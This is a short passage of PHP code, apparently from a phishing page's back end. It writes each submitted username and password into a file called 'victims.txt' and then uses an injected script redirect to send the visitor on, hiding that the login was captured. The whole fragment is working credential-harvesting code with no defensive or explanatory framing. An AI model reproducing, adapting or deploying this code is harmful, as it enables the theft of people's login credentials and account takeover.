fclose($f);
if ($u && $p){
    $f = fopen('victims.txt','a+');
    fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
    fclose($f);
    echo "<script>window.location = '".$r."';</script>";
}
